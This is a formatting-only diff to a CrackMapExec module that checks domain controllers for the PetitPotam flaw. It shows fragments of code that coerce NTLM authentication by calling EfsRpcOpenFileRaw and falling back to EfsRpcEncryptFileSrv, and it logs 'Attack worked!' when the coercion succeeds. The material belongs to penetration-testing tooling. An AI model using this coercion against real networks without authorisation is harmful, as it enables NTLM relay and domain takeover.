@@ -21,9 +21,7 @@ from impacket.uuid import uuidtup_to_bin
 
 class CMEModule:
     name = "petitpotam"
-    description = (
-        "Module to check if the DC is vulnerable to PetitPotam, credit to @topotam"
-    )
+    description = "Module to check if the DC is vulnerable to PetitPotam, credit to @topotam"
     supported_protocols = ["smb"]
     opsec_safe = True
     multiple_hosts = True
@@ -47,9 +45,7 @@ class CMEModule:
             domain=connection.domain,
             lmhash=connection.lmhash,
             nthash=connection.nthash,
-            target=connection.host
-            if not connection.kerberos
-            else connection.hostname + "." + connection.domain,
+            target=connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
             pipe=self.pipe,
             do_kerberos=connection.kerberos,
             dc_host=connection.kdcHost,
@@ -228,9 +224,7 @@ def coerce(
             "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
         },
     }
-    rpc_transport = transport.DCERPCTransportFactory(
-        binding_params[pipe]["stringBinding"]
-    )
+    rpc_transport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
     if hasattr(rpc_transport, "set_credentials"):
         rpc_transport.set_credentials(
             username=username,
@@ -281,9 +275,7 @@ def efs_rpc_open_file_raw(dce, listener, context=None):
             context.log.info("[+] Attack worked!")
             return True
         if str(e).find("rpc_s_access_denied") >= 0:
-            context.log.info(
-                "[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!"
-            )
+            context.log.info("[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!")
             context.log.info("[+] OK! Using unpatched function!")
             context.log.info("[-] Sending EfsRpcEncryptFileSrv!")
             try:
@@ -296,8 +288,6 @@ def efs_rpc_open_file_raw(dce, listener, context=None):
                     context.log.info("[+] Attack worked!")
                     return True
                 else:
-                    context.log.debug(
-                        "Something went wrong, check error status => %s" % str(e)
-                    )
+                    context.log.debug("Something went wrong, check error status => %s" % str(e))
         else:
             context.log.debug("Something went wrong, check error status => %s" % str(e))
